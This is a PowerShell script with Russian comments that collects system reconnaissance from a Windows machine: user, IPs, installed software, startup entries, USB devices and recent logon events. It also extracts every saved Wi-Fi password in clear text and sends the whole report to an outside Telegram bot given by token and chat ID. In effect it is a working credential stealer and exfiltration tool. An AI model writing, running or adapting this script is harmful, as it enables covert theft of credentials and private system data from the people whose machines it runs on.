param(
    [string]$botToken,
    [string]$chatId
)

# === Получение температуры CPU ===
function Get-CPUTemp {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if (-not $isAdmin) {
            return "Недостаточно прав"
        }

        $temp = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" | ForEach-Object {
            ($_.CurrentTemperature - 2732) / 10.0
        } | Select-Object -First 1

        if ($temp) {
            return "{0:N1} °C" -f $temp
        } else {
            return "Нет данных"
        }
    } catch {
        return "Не удалось получить"
    }
}

# === Сбор основной информации ===
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeFormatted = ((Get-Date) - $uptime).ToString("dd\.hh\:mm\:ss")
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" } | Select-Object -First 1 -ExpandProperty IPAddress)
try {
    $externalIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
} catch {
    $externalIP = "Не удалось получить"
}
$cpuTemp = Get-CPUTemp

# === Установленные программы ===
$appList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName } |
    Select-Object -First 10 DisplayName, DisplayVersion

$apps = ""
foreach ($app in $appList) {
    $apps += "$($app.DisplayName) ($($app.DisplayVersion))`n"
}

# === Сетевые параметры ===
$networkLines = ipconfig /all | Select-String "IPv4|DNS|Default Gateway"
$network = ""
foreach ($line in $networkLines) {
    $network += "$($line.Line)`n"
}

# === Автозагрузка ===
$startupItems = Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -First 10 Name, Command
$startup = ""
foreach ($item in $startupItems) {
    $startup += "$($item.Name): $($item.Command)`n"
}

# === USB-устройства ===
$usbList = Get-WmiObject Win32_USBControllerDevice | ForEach-Object {
    [wmi]($_.Dependent)
} | Select-Object -First 5 Description

$usbDevices = ""
foreach ($usb in $usbList) {
    $usbDevices += "$($usb.Description)`n"
}

# === Логи входа ===
$loginList = Get-EventLog -LogName Security -InstanceId 4624 -Newest 5
$logins = ""
foreach ($entry in $loginList) {
    $logins += "$($entry.TimeGenerated): $($entry.ReplacementStrings[5])`n"
}

# === Получение паролей Wi-Fi ===
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiPasswords = ""
foreach ($profile in $wifiProfiles) {
    $wifiDetails = netsh wlan show profile name="$profile" key=clear
    $wifiPassword = ($wifiDetails | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
    if ($wifiPassword) {
        $wifiPasswords += "<b>$profile</b>: $wifiPassword`n"
    }
}

# === Собираем полный текст сообщения ===
$message = @"
<b>Информация о ПК:</b>

<b>Пользователь:</b> $userName  
<b>Компьютер:</b> $compName  
<b>Аптайм:</b> $uptimeFormatted  
<b>Локальный IP:</b> $localIP  
<b>Внешний IP:</b> $externalIP  
<b>Температура CPU:</b> $cpuTemp

---

<b>Установленные программы:</b>  
$apps

---

<b>Сетевые параметры:</b>  
$network

---

<b>Автозагрузка:</b>  
$startup

---

<b>Подключённые USB-устройства:</b>  
$usbDevices

---

<b>Последние входы в систему:</b>  
$logins

---

<b>Сохранённые Wi-Fi сети и пароли:</b>  
$wifiPasswords
"@

# === Отправка в Telegram ===
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
    -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{
        chat_id = $chatId
        text = $message
        parse_mode = "HTML"
    }

Write-Host "Информация успешно отправлена в Telegram!"
